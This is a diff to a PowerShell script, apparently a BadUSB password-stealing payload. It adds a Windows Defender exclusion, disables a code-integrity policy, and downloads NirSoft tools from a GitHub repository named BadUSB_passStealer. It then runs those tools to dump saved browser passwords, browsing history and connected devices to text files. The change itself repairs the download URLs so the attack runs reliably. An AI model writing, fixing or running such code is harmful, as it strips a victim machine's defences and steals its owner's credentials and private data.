@@ -9,10 +9,13 @@ New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
 Add-MpPreference -ExclusionPath $basePath -Force
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -Type DWord -Value 0
 CiTool --refresh --json
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealyouknow/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe
+
+# URLs corrigées en mode Raw direct pour éviter l'interruption de connexion GitHub
+Invoke-WebRequest "https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files/WirelessKeyView.exe" -OutFile WirelessKeyView.exe
+Invoke-WebRequest "https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files/WebBrowserPassView.exe" -OutFile WebBrowserPassView.exe
+Invoke-WebRequest "https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files/BrowsingHistoryView.exe" -OutFile BrowsingHistoryView.exe
+Invoke-WebRequest "https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files/WNetWatcher.exe" -OutFile WNetWatcher.exe
+
 .\WNetWatcher.exe /stext connected_devices.txt
 .\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt
 .\WebBrowserPassView.exe /stext passwords.txt
